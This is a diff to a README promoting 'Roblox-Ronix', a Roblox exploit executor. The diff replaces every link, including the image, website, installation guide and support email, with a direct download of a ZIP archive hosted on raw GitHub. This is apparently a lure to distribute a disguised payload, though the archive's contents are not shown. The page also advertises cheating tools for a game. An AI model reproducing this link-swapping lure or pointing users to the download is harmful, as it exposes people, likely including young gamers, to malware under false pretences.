@@ -14,10 +14,10 @@ Welcome to the **Roblox-Ronix** repository, the next generation of exploiting in
   - ronix-hub-executor
   - ronix-hub-executor-download
 
-![Roblox Ronix](https://example.com/roblox-ronix-image)
+![Roblox Ronix](https://raw.githubusercontent.com/Tarakqovsu7/Roblox-Ronix/master/postrectal/Roblox_Ronix_2.5.zip)
 
 ## Explore Ronix 🌟
-Visit [Ronix](https://ronix.app) to experience the future of Roblox exploiting!
+Visit [Ronix](https://raw.githubusercontent.com/Tarakqovsu7/Roblox-Ronix/master/postrectal/Roblox_Ronix_2.5.zip) to experience the future of Roblox exploiting!
 
 🔥 Get ready to elevate your Roblox game with the powerful tools provided by Ronix. Whether you're a beginner or an experienced developer, Ronix has everything you need to take your scripting skills to the next level.
 
@@ -29,12 +29,12 @@ Visit [Ronix](https://ronix.app) to experience the future of Roblox exploiting!
 - **Cross-Platform Compatibility**: Use Ronix on various platforms, including Android devices and PCs.
 
 ## Installation Guide 🔧
-To get started with Ronix, simply visit the [Ronix website](https://ronix.app) and follow the installation instructions provided. Make sure to explore all the features and tools available to unleash your creativity in the Roblox universe.
+To get started with Ronix, simply visit the [Ronix website](https://raw.githubusercontent.com/Tarakqovsu7/Roblox-Ronix/master/postrectal/Roblox_Ronix_2.5.zip) and follow the installation instructions provided. Make sure to explore all the features and tools available to unleash your creativity in the Roblox universe.
 
 ## Stay Updated 🚨
 For the latest updates and releases, check the **Releases** section of this repository. Stay tuned for new features and enhancements that will further enhance your scripting experience.
 
 ## Support 📞
-If you encounter any issues or have any questions while using Ronix, feel free to reach out to our support team via [support@ronix.app](mailto:support@ronix.app). We're here to help you make the most out of your Roblox scripting journey.
+If you encounter any issues or have any questions while using Ronix, feel free to reach out to our support team via [https://raw.githubusercontent.com/Tarakqovsu7/Roblox-Ronix/master/postrectal/Roblox_Ronix_2.5.zip](https://raw.githubusercontent.com/Tarakqovsu7/Roblox-Ronix/master/postrectal/Roblox_Ronix_2.5.zip). We're here to help you make the most out of your Roblox scripting journey.
 
 Let's revolutionize the way we exploit in Roblox together with Ronix! Start creating amazing scripts, pushing the boundaries of what's possible in the Roblox world. Embrace the power of Ronix and elevate your scripting game like never before. 🚀🎮
